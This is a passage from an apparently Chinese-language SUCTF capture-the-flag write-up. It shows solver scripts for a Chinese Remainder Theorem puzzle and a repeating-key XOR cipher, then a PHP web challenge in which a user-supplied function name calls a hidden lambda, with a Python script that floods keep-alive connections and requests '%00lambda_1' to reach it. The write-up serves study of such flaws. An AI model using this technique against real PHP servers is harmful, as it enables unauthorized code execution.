class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 &lt;= 深入理解</span></span><br><span class="line"><span class="comment">#求模反元素，模逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span><span class="comment">#这个扩展欧几里得算法求模逆</span></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line">sand =  [<span class="number">222</span>, <span class="number">203</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">239</span>, <span class="number">82</span>, <span class="number">11</span>, <span class="number">220</span>, <span class="number">74</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">308</span>, <span class="number">195</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">4</span>]</span><br><span class="line">M=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> holes:</span><br><span class="line">M*=i</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> enumerate(holes):</span><br><span class="line">mi=j</span><br><span class="line">Mi=M/mi</span><br><span class="line">s=s+findModReverse(Mi,mi)*sand[i]*Mi</span><br><span class="line"><span class="keyword">print</span> str(hex(s%M)[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment"># This_is_the_CRT_xwg)</span></span><br></pre></td></tr></table></figure><p>韩信点兵问题，根据中国剩余定理构造通解</p><p><img src="1527361456797.png" alt="1527361456797"></p><h2 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h2><p>cycle.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"plain.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = flag.flag</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) &gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">assert</span> flag.languageOfPlain == <span class="string">"English"</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">"base_64"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>cipher.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BwcIRTcACAcJUycaGBFSP4bX6WM7BA0DPw4UTTcAGwcUAAcUAQBJIkBhJE4wGgwEczsMAhMJGxqI</span><br><span class="line">nMY2GwZJP0kmBFIgAQd5EgEJFxEfSToGRy0UAQDP8OUoDVI9Gx0cIwcIF1QlCBwTSSRZUzNVNUkp</span><br><span class="line">AFImEQQSPUNNLxsGBxdHYj8WGBhBIg1LipzYPwAfP08uDRUFGQcITqXJ/zVMKRFLNUE4BGMyPQsf</span><br><span class="line">AANIPQ8ARysHB5ucwCgHAFh0OAgfP2UkQgINSQwCRSRVARFBKAAFAgA2BwYYIE8CA1QHBQptdCIQ</span><br><span class="line">UxhFKwwFAVN0CQcXcxsFAFQFEBoPU0A0EBxJIAUOFgA1Bg1TOwYeRRMHBQptaC8HEAFMKRpLBE4w</span><br><span class="line">SAEaIE8KDBIcGmQ0UCMRFgZNLQdMFgA3BwcHIQABbzUGDU4lQT4YEhoAOwAfDQA8ARpTNQYeEQdi</span><br><span class="line">KAADACkZFhVSIBBLLAAwBwdUJ08eABFIBBcURSYTUwFQIwdLEUg1HEkfOhwZbycADE4UQSMRX1RX</span><br><span class="line">JAwZAAcwSBAcJk8aBBoGCE4AT3V/OxtXbAQeBkh0EQYGcxgMCxoJSRwOUyFKeT0HIUkFClR0BAYc</span><br><span class="line">OAYDAlQOBhxHUyUYFhZPKBBhMkkgAEkAPAIIRQcdGQsVSD8YEhoAKwANEVNeOwYeNk8eEAQNGwYC</span><br><span class="line">UiV/IBtNKUkNBEkmER0SPwpNBxgBGh1taj8GB1RTIwQOEUg9Bg5TGk8OBBpIHRsVTmoBHH5zIwQO</span><br><span class="line">B08wEUk6cwwMC1QDAB0UKgNVBBVOOEkYCk0xHAEaPQhNDwEbHU4LSSEQUwBIJRphIU87RQ0cPEIJ</span><br><span class="line">ChtESQoIT2cRHBsNKAYEb2Q7B0QXPABAARsHRU4DTyVYFxtPRi0ECg0wBwZeNwACSVQMBgFKRCUa</span><br><span class="line">XhBPI2MkDQAdSB4SPRtNFhsFDBoPSSQSUx5VPx1LCUk/DUkHOwYebzAHBkMDTyVYFxtPYEkPCk95</span><br><span class="line">DAYcfgsCCn4sBgFKRCUaXhBPI0VLAU87RQ0cPGUpChtFDQEIDS4aHFgAKAYESEQ7B0QXPABnKhxI</span><br><span class="line">IE4QQSQBUwdPIQwfDUk6D0kZJhwZRRgBAgtHVCIcAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1L</span><br><span class="line">KUkfDUknYiBUJQpNBxENB04VRSsRGhpHbAsECksnSAYVcwABAX48AQtHTC8SFhpEP0kKC0R0HAEW</span><br><span class="line">cwIUERwbYzoPRWoBFgdULQQOC1QnSB0bNhZNERsEDWQzSC9VHhtPIkkKC0R0AR0AcwoOCR0YGgtt</span><br><span class="line">YSQRUydVPAwZCEE6SBwdIQABCQdiKE4UVSMBUxZFKgYZAAA8DUkfOgkZFn4qHBpHaW0YUxpPOEkf</span><br><span class="line">DUV0AwAdN08CA1QYDBwUTyRVBxxBOEkCEQAyAR0AWTwFAFQbCAcDDGoCGxFSKU4PRVk7HUkEMgED</span><br><span class="line">BFQPBlFtaCUCUxlVLwFLHE8hSB4SPQEMRQYBGgVYKgNSHlROIx1LCU87AwAdNE8LCgZIGgEKRSga</span><br><span class="line">Fw0qGwAfDQAnBwQWcxwYFREaARsKQSRVFB1GOBphNk85DUkAJh8IFxwNGwFtcyUYFlRGLQAZHFQ1</span><br><span class="line">BAxTMQMEFgdiIxsUVGoGHBlFOAECC0d0IUkQMgFNEQEaB04TT0AmHBlFLgYPHAAdSAoSPU8ADAcb</span><br><span class="line">YydHVysbB1RTIwQOEUg9Bg5TORoeEVQEAAUCAD4dGgcqBUkcBE4gSBocPgoZDR0GDk4NVTkBUxhJ</span><br><span class="line">JwxLEUg9G2M8O08kRQMJBxpHUyUYFgBIJQcMRUohGx1TPwYGAFQcAQcUKg4aHFlEIwZGAU87REkX</span><br><span class="line">PABAARsHRAoIT0AxHBsNKAYESEQ7B0VTNwACSBAHBmQjTyVYFxtPYQ0ECgx0DAYcfgsCClkMBgFt</span><br><span class="line">byJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFioQBwZeNwACSBAHBkJHRCUaXhBPI0QP</span><br><span class="line">Ck9eLAYcfgsCClkMBgFLAC4aHFlEIwZhIU87RQ0cPEIJChtESQoIT2cRHBsNKAYEb3c8DRsWdAtN</span><br><span class="line">HBVIHg8JTitVFBsfRiEEEgA5HQobcxYCEFQfCAAJQWoHGgdLc2MiQk10BgYHcwMCCh8BBwlHRiUH</span><br><span class="line">UwdPIQwJCkQtYj4aJwdNFhsFDE4UVToQARxVIQgFRUc9Dh0AWTwCCBFIGhsXRTgdFgZPRjoECEV0</span><br><span class="line">DggaIRYZBBgNSQwLSTkGeT5VPx1LFk85DR0bOgEKRT1ICg8JAD4AARoAOAZhNk85DQscNxZNLFQL</span><br><span class="line">CABHSyMGAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1LKUkfDUknYiYbcyZNEhUGHU4UTycQBxxJ</span><br><span class="line">Ig5LD1UnHEkfOgQIRQAAAB1tbyJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFiobAEk6</span><br><span class="line">cxgMCwBIGgEKRT4dGhpHbAMeFlR0BAAYNk8ZDR0b</span><br></pre></td></tr></table></figure><p>类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 <a href="https://findneo.github.io/171005NuptVigenereWP/">https://findneo.github.io/171005NuptVigenereWP/</a> 。稍微更改其中读取密文部分即可。<code>flag{Something Just Like This}</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(file=<span class="string">'code.txt'</span>)</span>:</span></span><br><span class="line">    <span class="string">'''从文件中读取十六进制串，返回十六进制数组</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    c=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:x.strip(),open(<span class="string">'cipher.txt'</span>).readlines())).decode(<span class="string">'base_64'</span>)</span><br><span class="line">    cc= [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    <span class="comment"># print cc,len(cc)</span></span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line">    <span class="comment"># c = open(file).read()</span></span><br><span class="line">    <span class="comment"># codeintlist = []</span></span><br><span class="line">    <span class="comment"># codeintlist.extend(</span></span><br><span class="line">    <span class="comment">#     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))</span></span><br><span class="line">    <span class="comment"># return codeintlist</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">0xff</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0x20</span>,<span class="number">0x80</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">50</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join(map(chr,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'web.suctf.asuri.org'</span></span><br><span class="line">        PORT = <span class="number">81</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> requests.get(<span class="string">'http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1'</span>).content</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><code>$flag=&quot;SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}&quot;;</code> </p><h2 id="Getshell"><a href="#Getshell" class="headerlink" 